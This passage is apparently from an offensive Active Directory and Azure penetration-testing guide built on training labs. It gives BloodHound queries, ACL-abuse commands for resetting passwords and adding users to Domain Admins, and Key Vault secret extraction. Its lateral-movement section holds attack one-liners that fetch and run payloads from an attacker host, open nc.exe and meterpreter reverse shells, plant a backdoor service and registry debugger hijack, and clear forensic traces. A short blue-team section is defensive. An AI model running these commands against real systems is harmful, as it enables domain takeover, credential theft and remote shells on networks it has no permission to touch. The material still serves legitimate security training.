3.8.3 Marking Owned Principals

Right-click any node and select Mark as Owned (skull icon appears). Then run "Shortest Path from Owned Principals" from the Analysis tab to see available attack paths.

3.8.4 Finding Sessions

The Database Info tab shows session counts. Click the session count on any group or computer node to view the specific computers where those users are currently logged in.

Methodology

  • Search domain node and check object counts: 
    # BloodHound search bar:
domain:DOMAIN.LOCAL
  • Run "Find Shortest Paths to Domain Admins" from Analysis tab
  • Run "Find Principals with DCSync Rights"
  • Check Domain Users group: Outbound Object Control → Transitive Object Control
  • Mark owned nodes (skull icon) and run "Shortest Path from Owned Principals"
  • Find active DA sessions: click DA group → Sessions count → identify the host

3.9 Cypher Queries

BloodHound uses Neo4j's Cypher Query Language - a graph-optimized, SQL-inspired query language. Enable Query Debug Mode in Settings to see raw queries in the Raw Query box.

3.9.1 Cypher Syntax Elements

ElementDefinition
NodesRepresented with parentheses: (n:User)
VariablePlaceholder for a node or relationship: n, r, g
RelationshipsDashes and arrows: -[r:MemberOf]-> (directional) or - (bidirectional)
LabelGroups nodes by type: :User, :Group, :Computer
PropertyAttribute stored in curly braces: {name:"peter@domain"}

3.9.2 Cypher Keywords

KeywordDescription
MATCHFind nodes or relationships matching a pattern
WHEREAdd filters/constraints to the pattern
RETURNSpecify output format and data
CONTAINSString substring check
=~Regular expression match
shortestPath()Find shortest path between two nodes
allshortestPaths()Find all shortest paths between two nodes

3.9.3 Cypher Query Examples

-- Return all users
MATCH (u:User) RETURN u

-- Return specific user by name
MATCH (u:User {name:"[email protected]"}) RETURN u

-- Equivalent WHERE form
MATCH (u:User) WHERE u.name = "[email protected]" RETURN u

-- Return group membership for peter
MATCH (u:User {name:"[email protected]"})-[r:MemberOf]->(peterGroups)
RETURN peterGroups

-- Return full path including nodes and relationships (for BloodHound GUI)
MATCH p=((n:User {name:"[email protected]"})-[r:MemberOf]->(g:Group))
RETURN p

-- Transitive group membership (any depth)
MATCH p=((u:User {name:"[email protected]"})-[r:MemberOf*1..]->(g:Group))
RETURN p

-- Depth-limited membership (1 or 2 hops)
MATCH p=(n:User)-[r1:MemberOf*1..2]->(g:Group)
RETURN p

-- Filter path where first group name contains ITSECURITY
MATCH p=(n:User)-[r1:MemberOf*1..]->(g:Group)
WHERE nodes(p)[1].name CONTAINS 'ITSECURITY'
RETURN p

-- Same filter using regex (case-insensitive)
MATCH p=(n:User)-[r1:MemberOf*1..]->(g:Group)
WHERE nodes(p)[1].name =~ '(?i)itsecurity.*'
RETURN p

-- Shortest paths to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN [email protected]"}))
WHERE NOT n=m
RETURN p

-- Shortest path from any node matching 'peter' to anything (most useful query)
MATCH p = shortestPath((n)-[*1..]->(c))
WHERE n.name =~ '(?i)peter.*' AND NOT c=n
RETURN p

-- All shortest paths from peter to anything
MATCH p = allshortestPaths((n)-[*1..]->(c))
WHERE n.name =~ '(?i)peter.*' AND NOT c=n
RETURN p
-- Identify ACL relationships via PowerView if BloodHound returns no results
-- (run in BloodHound Raw Query box or Neo4j console)

-- Unconstrained delegation computers (excluding DCs)
MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.objectsid ENDS WITH "516"
WITH COLLECT(dc) as domainControllers
MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true})
WHERE NOT c in domainControllers
RETURN p

-- Shortest path to Domain Admins from any node
MATCH (n:User), (m:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}),
p=shortestPath((n)-[*1..]->(m))
RETURN p

-- Domain Users dangerous permissions on computers
MATCH p=(g:Group)-[r:Owns|WriteDacl|GenericAll|WriteOwner|ExecuteDCOM|GenericWrite|AllowedToDelegate|ForceChangePassword]->(c:Computer)
WHERE g.name STARTS WITH "DOMAIN USERS"
RETURN p

-- All users with non-blank description field (may contain passwords)
MATCH (u:User)
WHERE u.description IS NOT NULL
RETURN u.name,u.description

-- All local admins and the computers they admin
MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c)
WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins
RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS
ORDER BY ADMIN_COUNT DESC

-- Find any node with WriteSPN edge
MATCH p=((n)-[r:WriteSPN]->(m)) RETURN p
Note: Replace shortestPath with allshortestPaths to get every available relationship. Replace WriteSPN in the last query with any edge name to search for it.

3.9.4 Saving Custom Queries

Custom queries are stored in customqueries.json:

  • Windows: AppData\Roaming\bloodhound\customqueries.json
  • Linux: /home/<username>/.config/bloodhound/customqueries.json or /root/.config/bloodhound/customqueries.json
ls /root/.config/bloodhound
{
   "queries": [
       {
           "name": "From Peter to Anything",
           "category": "Shortest Paths",
           "queryList": [
               {
                   "final": true,
                   "query": "MATCH p = allshortestPaths((n)-[*1..]->(c)) WHERE n.name =~ '(?i)peter.*' AND NOT c=n RETURN p",
                   "allowCollapse": true
               }
           ]
       }
   ]
}
{
   "queries": [
       {
           "name": "Search From Owned to Anything",
           "category": "Shortest Paths",
           "queryList": [
               {
                   "final": false,
                   "title": "Select the node to search...",
                   "query": "MATCH (n {owned:true}) RETURN n.name",
                   "props": { "name": ".*" }
               },
               {
                   "final": true,
                   "query": "MATCH p = allshortestPaths((n)-[*1..]->(c)) WHERE n.name = $result AND NOT c=n RETURN p",
                   "allowCollapse": true,
                   "endNode": "{}"
               }
           ]
       }
   ]
}

3.9.5 PowerView ACL Enumeration (when BloodHound returns no results)

Import-Module c:\tools\PowerView.ps1
Get-DomainObjectAcl -Identity peter -domain INLANEFREIGHT.HTB -ResolveGUIDs

Methodology

  • Enable Query Debug Mode in Settings to see raw Cypher queries
  • Run domain overview query and note user/group/computer counts: 
    domain:INLANEFREIGHT.HTB
  • Run shortest path from any owned node to anything (key query): 
    MATCH p = allshortestPaths((n)-[*1..]->(c))
WHERE n.name =~ '(?i)username.*' AND NOT c=n
RETURN p
  • Find Domain Users dangerous permissions on computers: 
    MATCH p=(g:Group)-[r:Owns|WriteDacl|GenericAll|WriteOwner|ExecuteDCOM|GenericWrite|AllowedToDelegate|ForceChangePassword]->(c:Computer)
WHERE g.name STARTS WITH "DOMAIN USERS"
RETURN p
  • Find all users with description field (may contain credentials): 
    MATCH (u:User)
WHERE u.description IS NOT NULL
RETURN u.name,u.description
  • Identify all local admins across the domain: 
    MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c)
WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins
RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS
ORDER BY ADMIN_COUNT DESC
  • If BloodHound returns nothing, fall back to PowerView ACL enumeration: 
    Import-Module c:\tools\PowerView.ps1
Get-DomainObjectAcl -Identity <user> -domain <DOMAIN> -ResolveGUIDs

3.10 Abusable Permissions and Attack Paths

3.10.1 Identifying Local Administrators

Query: (u:User) - [:AdminTo] -> (c:Computer)

Use First Degree Local Admin and Group Delegated Local Admin Rights on a user node to see which machines they administer. Reverse: Explicit Admins and Unrolled Admins on a computer node.

3.10.2 Identifying Active Sessions

Query: (u:User) - [:HasSession] -> (c:Computer)

Shows which computers have a Domain Admin (or other high-value user) currently logged in - identifying the best lateral movement targets.

3.10.3 Viewing ACLs

Query: (u:User) - [:GenericAll] -> (g:Group)

Key abusable ACL permissions tracked by BloodHound:

PermissionAbuse
ForceChangePasswordReset another user's password
AddMembersAdd accounts to groups
GenericAllFull control - password reset, SPN registration, group add
GenericWriteWrite non-protected attributes (scriptPath, SPN)
WriteOwnerChange ownership to gain additional permissions
WriteDACLModify permissions - grant arbitrary ACEs
AllExtendedRightsAll extended rights (includes ForceChangePassword)
ReadLAPSPasswordRead LAPS-managed local admin password
OwnsOwnership grants full control

3.10.4 Unconstrained Delegation

Query: (c:Computer {UnconstrainedDelegation:true})

-- Non-DC computers with unconstrained delegation
MATCH (dc:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.objectsid ENDS WITH "516"
WITH COLLECT(dc) as domainControllers
MATCH p = (d:Domain)-[:Contains*1..]->(c:Computer {unconstraineddelegation:true})
WHERE NOT c in domainControllers
RETURN p

3.10.5 Exploiting GenericWrite

GenericWrite allows modification of all standard writable attributes on an object.

Target ObjectAttack
UserSet servicePrincipalName → request TGS → targeted Kerberoasting
GroupAdd attacker account to group → inherit all group permissions
ComputerModify msDS-KeyCredentialLink → shadow credentials → authenticate as computer
 
# Targeted Kerberoasting via WriteSPN - using targetedKerberoast
git clone https://github.com/ShutdownRepo/targetedKerberoast

3.10.6 Exploiting GenericAll / AddMembers

# Add user to Domain Admins via net rpc
net rpc group addmem "Domain Admins" motasem -U motasem.local/motasem%'Password1' -S 192.168.1.2

# Add user to Domain Admins via BloodyAD
bloodyAD --host "192.168.1.2" -d "motasem.local" -u "motasem" -p "Password1" add groupMember "Domain Admins" "motasem"

# Add via net group (on Windows with domain admin context)
net group "Domain Admins" motasem /add /domain
# Add via PowerView
powershell -ep bypass
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Password1' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('motasem.local\motasem', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'motasem' -Credential $Cred

# Add via AD module
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
Get-ADGroupMember -Identity "IT Support"

3.10.7 Exploiting WriteOwner ACE

Import-Module .\PowerView.ps1
# Take ownership of target object
Set-DomainObjectOwner -identity claire -OwnerIdentity Bob
# Grant ResetPassword right to Bob over Alice
Add-DomainObjectAcl -TargetIdentity Alice -PrincipalIdentity Bob -Rights ResetPassword
# Reset Alice's password
$cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
Set-DomainUserPassword -identity Alice -accountpassword $cred

3.10.8 Exploiting WriteDacl ACE

# Grant Bob membership in Administrator group via WriteDacl
net group "Administrator" Bob /add /domain

3.10.9 Exploiting ForceChangePassword ACE

# Identify members of target group
Get-ADGroupMember -Identity "Tier 2 Admins"

# Force password reset
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password

3.10.10 Exploiting WriteSPN (Targeted Kerberoasting)

With WriteSPN over an account, set a temporary SPN, request the TGS, capture the hash, then remove the SPN.

# Clone targetedKerberoast
git clone https://github.com/ShutdownRepo/targetedKerberoast

# Run against target to obtain crackable hash
python3 targetedKerberoast.py -d <domain> -u <user> -p <password> --dc-ip <DC_IP>

3.10.11 Exploiting ReadGMSAPassword

Group Managed Service Accounts (GMSAs) have automatically rotated passwords managed by the DC. If you have ReadGMSAPassword, you can retrieve the current password and impersonate the account.

# Read the GMSA password using BloodyAD
bloodyAD -d hacked.ltd -u hacked-user -p [password]-password --host [dc].hacked.ltd \
  get object '[machine]$' --attr msDS-ManagedPassword

3.10.12 Chained Attack Path Example

# Force password change on SAM (using [machine]$ ForceChangePassword)
bloodyAD -d [domain] -u [machine]$ -p '<password>' --host [dc].[domain] \
  set password sam 'Passw0rd'

# As sam - take ownership of john
bloodyAD -d [domain] -u sam -p '[password]' --host [dc].[domain] \
  set owner john sam

# Give sam GenericAll over john
bloodyAD -d [domain] -u sam -p '[password]' --host [dc].[domain] \
  add genericAll john sam

3.10.13 Understanding Inbound Object Control

Click a group node → scroll to Inbound Object Control section:

CategoryDescription
Explicit Object ControllersFirst-degree controllers (may include inherited ACEs)
Unrolled Object ControllersActual principals holding rights through delegated security groups
Transitive Object ControllersAll attack paths reachable via ACL abuse only

Methodology

  • Identify users with local admin rights across the domain: 
    MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
  • Find active DA sessions on workstations: 
    MATCH p=(u:User)-[:HasSession]->(c:Computer) WHERE u.admincount=true RETURN p
  • Abuse ForceChangePassword with PowerView: 
    $SecPassword = ConvertTo-SecureString '<AttackerPass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<attacker>', $SecPassword)
$NewPass = ConvertTo-SecureString '<NewPass>' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $NewPass -Credential $Cred -Verbose
  • Abuse GenericAll to add self to privileged group: 
    bloodyAD --host <DC_IP> -d <DOMAIN> -u <user> -p <pass> add groupMember "Domain Admins" <user>
  • Exploit WriteSPN for targeted Kerberoasting: 
    python3 targetedKerberoast.py -d <DOMAIN> -u <user> -p <pass> --dc-ip <DC_IP>
  • Read GMSA password if ReadGMSAPassword edge exists: 
    bloodyAD -d <DOMAIN> -u <user> -p <pass> --host <DC> get object '<GMSA$>' --attr msDS-ManagedPassword

3.11 BloodHound for Blue Teams

BloodHound data can be used defensively to identify misconfigurations and plan remediation. Two open-source tools extend this capability.

3.11.1 BlueHound

BlueHound automates the full cycle of SharpHound collection, analysis, and reporting with a click.

# Install (Windows)
Expand-Archive .\BlueHound-win32-x64-1.1.0.zip .
# Run BlueHound.exe, login with neo4j credentials

# Query runner - count enabled users
MATCH (u:User {enabled:true})
RETURN COUNT(u)

Key monitoring targets:

  • Administrators with sessions on non-Domain machines
  • Dangerous privileges in the Domain Users group
  • Paths from Kerberoastable users
  • Users with higher privileges on computers
  • Users that do not require pre-authentication
  • Users with more sessions

3.11.2 PlumHound

PlumHound wraps BloodHound/Neo4j Cypher into reports and can identify which relationship to remove to break an attack path.

# Install
cd C:\Tools\PlumHound
python -m pip install -r requirements.txt

# Verify installation
python PlumHound.py --easy -p [password]

# Path Analyzer - find which relationship to remove to break a path
python PlumHound.py -p [password] -ap "DOMAIN [email protected]" "WS01.INLANEFREIGHT.HTB"

Example output: "Removing the relationship GpLink between <GPO> and <OU> breaks the path!"

Note: Not all PlumHound remediation recommendations are safe. Removing a DC from the Domain Controller container would break domain functionality. Review all recommendations before actioning them.

3.12 Azure Enumeration with AzureHound

BloodHound 4.x supports Azure via AzureHound. Azure-specific nodes and edges are prefixed with AZ.

3.12.1 Azure Node Types

NodeDescription

AZAppAzure AD application
AZSubscriptionAzure subscription
AZResourceGroupAzure resource group
AZVMAzure virtual machine
AZDeviceAzure AD device
AZServicePrincipalAzure service principal

3.12.2 Azure Edge Types

EdgeDescription
AZAddMembersAdd members to a group or directory role
AZAddOwnerAdd owners to a subscription or management group
AZAppAdminAssigned to admin role for Azure AD application
AZCloudAppAdminAdmin role for cloud application
AZContributorContributor role at resource scope
AZExecuteCommandPermission to execute commands on a VM
AZGetCertificatesRetrieve certificates from Key Vault
AZGetKeysRetrieve keys from Key Vault
AZGetSecretsRetrieve secrets from Key Vault
AZGlobalAdminGlobal Administrator role

AZPrivilegedRoleAdminPrivileged Role Administrator

3.12.3 Running AzureHound

# Create vulnerable Azure lab edges using TheEdgeMaker
.\TheEdgeMaker.ps1

# Run AzureHound - authenticate and enumerate tenant
.\azurehound.exe -u "isabella@plaintexthacktheboxgmail.onmicrosoft.com" -p "HacktheboxAcademy01!" list --tenant "plaintexthacktheboxgmail.onmicrosoft.com" -o all.json

# Import all.json into BloodHound GUI via Upload button
Note: AzureHound is a Go binary. It requires valid Azure AD credentials (or device code flow). The -o flag writes all collected data to a single JSON file for import.

3.12.4 PowerZure - Azure Attacks

PowerZure is an offensive Azure framework similar to PowerView for on-premises AD. It requires the Azure PowerShell module and valid credentials.

# Reset an Azure AD user's password
Set-AzureADUserPassword -Username charlotte@plaintexthacktheboxgmail.onmicrosoft.com -Password [password]PwnCloud01

# Add user to a subscription role group
Add-AzureADGroupMember -Group "Subscription Reader" -Username charlotte@plaintexthacktheboxgmail.onmicrosoft.com

# Execute command on Azure VM (PowerZure wrapper)
Invoke-AzureRunCommand -VMName "AZVM-01" -Command whoami

# Native Az module equivalent
Invoke-AzVMRunCommand -ResourceGroupName "PRODUCTION" -CommandId "RunPowerShellScript" -VMName "AZVM-01" -ScriptString "whoami"

3.12.5 Azure Key Vault Credential Extraction

# List secrets in a Key Vault
Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519

# Retrieve specific secret (returns SecureString)
$secret = Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519 -Name HTBKeyVault

# Decrypt SecureString to plaintext
[System.Net.NetworkCredential]::new('', $secret.SecretValue).Password
Note: Key Vault access requires the AZGetSecrets edge (or AZOwns / AZContributor) in BloodHound's Azure graph. Check the BloodHound Azure node for the Key Vault and expand inbound control rights.

Methodology

  • Set up the Azure lab environment: 
    .\TheEdgeMaker.ps1
  • Run AzureHound and collect tenant data: 
    .\azurehound.exe -u "user@tenant.onmicrosoft.com" -p "Password" list --tenant "tenant.onmicrosoft.com" -o azure_data.json
  • Import azure_data.json into BloodHound GUI via Upload Data button
  • Search for Azure nodes in BloodHound: prefix search with AZUser:, AZVM:, AZKeyVault:
  • Run analytics queries: "Shortest Paths to Azure Global Admins", "All Azure Service Principals"
  • Reset passwords and add users to groups via PowerZure: 
    Set-AzureADUserPassword -Username user@tenant -Password NewPassword
Add-AzureADGroupMember -Group "Target Group" -Username user@tenant
  • Execute commands on VMs: 
    Invoke-AzVMRunCommand -ResourceGroupName "RG" -CommandId "RunPowerShellScript" -VMName "VMNAME" -ScriptString "whoami"
  • Extract Key Vault secrets: 
    $secret = Get-AzKeyVaultSecret -VaultName VAULT_NAME -Name SECRET_NAME
[System.Net.NetworkCredential]::new('', $secret.SecretValue).Password

4. Windows Lateral Movement

4.1 Introduction

Lateral movement refers to techniques used to move through a network after gaining initial access, pivoting from system to system in search of credentials, sensitive data, and high-value assets. To perform lateral movement, you need some form of credential: passwords, hashes, tickets, SSH keys, or session cookies.

The MITRE ATT&CK framework (TA0008) defines lateral movement as techniques to enter and control remote systems on a network, often using either remote access tools or legitimate credentials with native tools.

Technique ID Name Description
T1021 Remote Services Use of legitimate remote services like RDP, SMB, and SSH to move through a network.
T1021.001 Remote Desktop Protocol (RDP) Using RDP to interact with a remote system's desktop.
T1021.002 SMB/Windows Admin Shares Exploiting SMB shares to access files and execute commands.
T1021.003 Distributed Component Object Model Using DCOM to interact with software components on remote systems.
T1021.004 SSH Utilizing SSH to securely connect and control remote systems.
T1021.005 VNC Using VNC for remote control of systems.
T1105 Ingress Tool Transfer Transferring tools or files to remote systems for execution.
T1550 Use Alternate Authentication Material Using stolen tokens, keys, or certificates for authentication.
T1569.002 Service Execution Executing commands or scripts using system services.
T1570 Lateral Tool Transfer Moving tools from one system to another within a network.

4.1.1 Direct vs. Indirect Lateral Movement

Direct lateral movement means executing commands directly on the target and forcing it to connect back. Indirect lateral movement involves making the target receive instructions from a third system (e.g., compromising a WSUS server to deliver a malicious update to an isolated machine).

4.1.2 Credential Types for Lateral Movement

Credential Type Usage
Passwords Traditional plaintext authentication.
NTLM Hashes Pass the Hash attacks without needing the plaintext password.
NTLMv2 Hashes Abused via NTLM Relay attacks for lateral movement.
AES256 Keys Used for authentication with Rubeus or Mimikatz.
Kerberos Tickets Forged or captured tickets (Pass the Ticket).
SSH Keys Private key authentication for SSH-enabled Windows/Linux targets.

4.1.3 Pivoting Setup (Chisel)

When targets are not directly reachable, set up a SOCKS5 proxy via chisel.

# /etc/proxychains.conf
socks5 127.0.0.1 1080

# On Linux attack host - start chisel server
./chisel server --reverse

# On [host] (Windows) - connect client
.\chisel.exe client [target-ip]:8080 R:socks

# Prefix commands with proxychains4 -q to route through tunnel
Note: Ligolo-ng is recommended over chisel when using PwnBox due to better performance.

4.2 Remote Desktop Protocol (RDP)

RDP is a Microsoft proprietary protocol providing graphical remote access. It uses TCP 3389 by default. Only members of the Administrators or Remote Desktop Users groups can connect unless explicitly granted.

4.2.1 RDP Enumeration

# Scan for RDP with nmap
nmap -p 3389 -sV [target-ip]/24

# Test credentials with netexec
netexec rdp [target-ip]/24 -u helen -p '[password]' -d [domain]
Note: (Pwn3d!) in netexec output means the user has RDP rights, not necessarily admin rights.

4.2.2 RDP from Windows

# Launch the RDP client
mstsc.exe

4.2.3 RDP from Linux

# Basic connection
xfreerdp /u:Helen /p:'[password]' /d:[domain] /v:[target-ip] \
  /dynamic-resolution /drive:.,linux

# Optimized for low-bandwidth / proxy connections
xfreerdp /u:Helen /p:'[password]' /d:[domain] /v:[target-ip] \
  /dynamic-resolution /drive:.,linux /bpp:8 /compression \
  -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
Flag Effect
/bpp:8 Reduces color depth to 8-bit
/compression Enables data compression
-themes Disables desktop themes
-wallpaper Disables wallpaper
/audio-mode:0 Disables audio redirection
/auto-reconnect Reconnects automatically on drop
-glyph-cache Caches text glyphs to reduce bandwidth
/drive:.,linux Redirects local filesystem into the remote session

4.2.4 Restricted Admin Mode

Restricted Admin Mode performs a network logon instead of an interactive logon, preventing credential caching on the remote system. When enabled, it permits Pass the Hash and Pass the Ticket for RDP. Only members of the Administrators group can use it.

# Check if Restricted Admin Mode is enabled (0 = enabled, 1 = disabled)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

# Enable Restricted Admin Mode
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD

# Disable Restricted Admin Mode
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD

4.2.5 Pass the Hash / Pass the Ticket via RDP

# Pass the Hash from Linux with xfreerdp
proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB \
  /d:[domain] /v:[target-ip]
# Pass the Ticket from Windows - forge TGT with Rubeus
.\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new PowerShell window, import the TGT
.\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB \
  /domain:[domain] /ptt

# Then launch RDP using the injected ticket
mstsc.exe /restrictedAdmin

4.2.6 SharpRDP

SharpRDP is a .NET tool that performs authenticated remote command execution via RDP without requiring a GUI client or SOCKS proxy. It uses the mstscax.dll terminal services library.

# On Linux - start Metasploit listener
msfconsole -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; \
  set LHOST [target-ip]; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"

# Generate PowerShell reflection payload
msfvenom -p [password]/x64/meterpreter/reverse_https LHOST=[target-ip] LPORT=8888 \
  -f psh-reflection -o s

# Host the payload
sudo python3 -m http.server 80
# Execute via SharpRDP (command limit: 259 characters)
.\SharpRDP.exe computername=srv01 \
  command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://[target-ip]/s')" \
  username=[domain]\[user] password=RedRiot88

# Clean up Run MRU entries with CleanRunMRU
wget -Uri http://[target-ip]/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
.\CleanRunMRU.exe clearall

Methodology

  • Scan for RDP (TCP 3389 or non-default ports): 
    nmap -p 3389 -sV [target-ip]/24
  • Validate credentials with netexec: 
    netexec rdp [target-ip]/24 -u helen -p '[password]' -d [domain]
  • Connect via xfreerdp from Linux (route through proxy if needed): 
    proxychains4 -q xfreerdp /u:Helen /p:'[password]' /d:[domain] \
  /v:[target-ip] /dynamic-resolution /drive:.,linux
  • Check / enable Restricted Admin Mode for Pass the Hash: 
    reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
  • Pass the Hash via xfreerdp if Restricted Admin Mode is enabled: 
    proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB \
  /d:[domain] /v:[target-ip]
  • For GUI-less execution, use SharpRDP: 
    .\SharpRDP.exe computername=TARGET \
  command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload')" \
  username=DOMAIN\USER password=PASS

4.3 Server Message Block (SMB)

SMB is a network file-sharing protocol operating on TCP 445 and TCP 139. Lateral movement via SMB requires an account that is a member of the local Administrators group on the target. UAC restrictions apply to non-RID-500 local accounts.

UAC Restriction Detail
Local admin (non-RID 500) Cannot run PsExec-style tools on Vista and later.
RID 500 local admin Can utilize PsExec on any machine.
Domain users with local admin rights Can execute PsExec-style tools.

4.3.1 SMB Named Pipes

Named Pipe Used By Function
svcctl psexec.py, smbexec.py, SharpNoPSExec Remote service creation, start, stop
atsvc atexec.py Remote scheduled task creation
winreg reg.exe, reg.py Remote registry access and modification

4.3.2 SMB Enumeration

# Scan for SMB ports
proxychains4 -q nmap [target-ip] -sV -sC -p 139,445 -Pn

4.3.3 Lateral Movement from Windows

PsExec

PsExec uploads a service binary to ADMIN$, registers it via SCM, then redirects I/O through a named pipe. It creates an interactive logon (Type 2), bypassing the double-hop problem.

# Interactive shell on remote host
.\PsExec.exe \\SRV02 -i -u [DOMAIN]\[user] -p [password] cmd

# Run as SYSTEM
.\PsExec.exe \\SRV02 -i -s -u [DOMAIN]\[user] -p [password] cmd
SharpNoPSExec

SharpNoPSExec avoids creating new services by hijacking an existing stopped/disabled service with LocalSystem privileges, modifying its binary path to execute a payload, waiting ~5 seconds, then restoring the original configuration.

# Start a listener first (on attack host)
# nc -lnvp 8080

# Execute payload via existing service
.\SharpNoPSExec.exe --target=[target-ip] `
  --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e BASE64PAYLOAD"

# Specify credentials explicitly (optional)
.\SharpNoPSExec.exe --target=[target-ip] --username=helen --password=RedRiot88 `
  --domain=[domain] `
  --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e BASE64PAYLOAD"
NimExec

NimExec is a fileless tool that uses custom RPC packets over SMB and the svcctl named pipe to modify a service binary path. It authenticates via NTLM hash and avoids standard WinAPI calls, benefiting from Nim's cross-compilation.

# With plaintext password
.\NimExec.exe -u helen -d [domain] -p [password] -t [target-ip] `
  -c "cmd.exe /c powershell -e BASE64PAYLOAD" -v

# With NTLM hash instead of password
.\NimExec.exe -u helen -h NTLMHASH -d [domain] -t [target-ip] `
  -c "cmd.exe /c powershell -e BASE64PAYLOAD" -v

# Target a specific service
.\NimExec.exe -u helen -p [password] -d [domain] -t [target-ip] `
  -s AppMgmt -c "cmd.exe /c powershell -e BASE64PAYLOAD"
Reg.exe (Registry-Based RCE)

Remote write access to the registry via the winreg SMB pipe provides RCE by setting an Image File Execution Options debugger. When the target application is launched by any user, the payload executes.

# Host nc.exe payload via SMB share (on Linux attack host)
# sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe

# On Windows - inject debugger for msedge.exe on remote target
reg.exe add "\\srv02.[domain]\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" `
  /v Debugger /t reg_sz `
  /d "cmd /c copy \\[target-ip]\share\nc.exe && nc.exe -e \windows\system32\cmd.exe [target-ip] 8080"

# Allow unauthenticated SMB guest access (if needed)
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters `
  /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f

4.3.4 Lateral Movement from Linux (Impacket)

psexec.py
# Get interactive SYSTEM shell via ADMIN$ upload
proxychains4 -q psexec.py INLANEFREIGHT/helen:'[password]'@[target-ip]
smbexec.py
# Semi-interactive shell; no file upload, uses svcctl pipe only
proxychains4 -q smbexec.py INLANEFREIGHT/helen:'[password]'@[target-ip]
services.py
# List all services on target
proxychains4 -q services.py INLANEFREIGHT/helen:'[password]'@[target-ip] list

# Generate service payload
msfvenom -p [password]/x64/shell_reverse_tcp LHOST=[target-ip] LPORT=9001 \
  -f exe-service -o rshell-9001s.exe

# Host payload via SMB server
sudo smbserver.py share -smb2support ./

# Create a new malicious service
proxychains4 -q services.py INLANEFREIGHT/helen:'[password]'@[target-ip] \
  create -name 'Service Backdoor' -display 'Service Backdoor' \
  -path "\\\\[target-ip]\\share\\rshell-9001.exe"

# Verify service configuration
proxychains4 -q services.py INLANEFREIGHT/helen:'[password]'@[target-ip] \
  config -name 'Service Backdoor'

# Start the service (triggers payload)
proxychains4 -q impacket-services INLANEFREIGHT/helen:'[password]'@[target-ip] \
  start -name 'Service Backdoor'

# Hijack an existing service (e.g., Spooler)
proxychains4 -q impacket-services INLANEFREIGHT/helen:'[password]'@[target-ip] \
  config -name Spooler
proxychains4 -q impacket-services INLANEFREIGHT/helen:'[password]'@[target-ip] \
  change -name Spooler -path "\\\\[target-ip]\\share\\rshell-9001.exe" -start_type 2
proxychains4 -q impacket-services INLANEFREIGHT/helen:'[password]'@[target-ip] \
  start -name Spooler

# Delete service after use
proxychains4 -q services.py INLANEFREIGHT/helen:'[password]'@[target-ip] \
  delete -name 'Service Backdoor'
atexec.py

Uses the Windows Task Scheduler (atsvc pipe). Output is written to a temp file and retrieved via ADMIN$. Clocks must be synchronized within 1 minute.

# Execute a command via scheduled task (output retrieved via ADMIN$)
proxychains4 -q atexec.py INLANEFREIGHT/helen:'[password]'@[target-ip] \
  "powershell -e BASE64PAYLOAD"

Methodology

  • Confirm SMB is open on target: 
    proxychains4 -q nmap [target-ip] -sV -sC -p 139,445 -Pn
  • From Linux - get interactive shell with psexec.py: 
